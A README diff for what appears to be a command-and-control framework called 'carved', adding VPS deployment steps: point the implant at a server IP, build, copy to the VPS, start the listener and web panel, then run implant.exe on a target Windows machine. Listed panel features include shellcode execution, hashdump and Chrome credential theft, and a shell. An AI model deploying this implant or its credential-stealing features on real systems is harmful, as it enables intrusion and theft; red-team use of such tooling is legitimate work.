@@ -92,7 +92,35 @@ edit `server/pkg/web/panel.go` for web panel credentials:
 - default username: `carvedadmin`
 - default password: `carvedpassword123`
 
-## running
+## deployment
+
+### quick setup with vultr
+
+1. spin up a vps on [vultr](https://www.vultr.com/) (or any vps provider) - ubuntu/debian works great
+2. note your public ip address
+3. edit `implant/cmd/main.go` and set `ServerURL` to your vps ip:
+   ```go
+   ServerURL = "http://YOUR_VPS_IP:8443/"
+   ```
+4. build everything locally:
+   ```bash
+   ./build.sh
+   ```
+5. scp the build directory to your vps:
+   ```bash
+   scp -r build/ root@YOUR_VPS_IP:/opt/carved/
+   scp -r BOFs/ root@YOUR_VPS_IP:/opt/carved/
+   ```
+6. ssh into your vps and start the server:
+   ```bash
+   ssh root@YOUR_VPS_IP
+   cd /opt/carved
+   ./server -port 9000 -listener 8443
+   ```
+7. access the web panel at `http://YOUR_VPS_IP:9000`
+8. run `implant.exe` on target windows machine
+
+### running locally
 
 start the server:
 ```bash
@@ -271,6 +299,10 @@ single-page application with:
 - shellcode upload and execution with method selection
 - credential viewer
 - results filtering by type (hashdump, chrome, shell, bof)
+
+## credits
+
+- [TrustedSec](https://github.com/trustedsec) - the BOFs in the `BOFs/` directory are from their [CS-Situational-Awareness-BOF](https://github.com/trustedsec/CS-Situational-Awareness-BOF) and [CS-Remote-OPs-BOF](https://github.com/trustedsec/CS-Remote-OPs-BOF) repos. huge thanks for the awesome open source tooling!
 
 ## dependencies
 
